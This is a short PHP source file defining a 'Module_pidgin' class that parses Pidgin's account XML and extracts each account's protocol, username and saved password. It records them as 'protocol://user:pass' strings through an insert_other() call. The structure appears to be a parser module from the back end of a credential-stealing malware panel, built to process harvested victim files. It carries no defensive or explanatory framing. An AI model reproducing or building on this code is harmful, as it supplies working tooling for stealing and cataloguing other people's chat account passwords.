<?php
class Module_pidgin extends Module_
{
    protected function ProcessPidgin($Data)
    {
        $XML_ = simplexml_load_string($Data);
        if(!$XML_)
            return FALSE;

        $Cnt = 0;
        $Exists = isset($XML_->account[$Cnt]);
        while($Exists)
        {
            $this->ProcessAccount($XML_->account[$Cnt]);
            $Exists = isset($XML_->account[++$Cnt]);
        }

        $XML_ = NULL;
    }

    function ProcessAccount($Elements)
    {
        $Protocol = '';
        if(preg_match('/prpl\-(.*)/mi', $Elements->protocol, $MatchResult))
            $Protocol = $MatchResult[1];

        $User = Assign_(str_replace(array("/", "/Home", "/home"), '', trim($Elements->name)));
        $Pass = Assign_(trim($Elements->password));

        $this->insert_other($Protocol . "://" . $User . ":" . $Pass);
    }

    public function process_module($Data, $Version)
    {
        if (strpos($Data, 'UTF-8') === false && strpos($Data, 'utf-8') === false)
        {
            $Data = utf8_encode($Data);
            $Data = str_replace('encoding="ISO-8859-1"', 'encoding="UTF-8"', $Data);
        }

        switch ($Version)
        {
        case 0:
            $this->ProcessPidgin($Data);
            break;
        default:
            return FALSE;
        }

        return TRUE;
    }
}
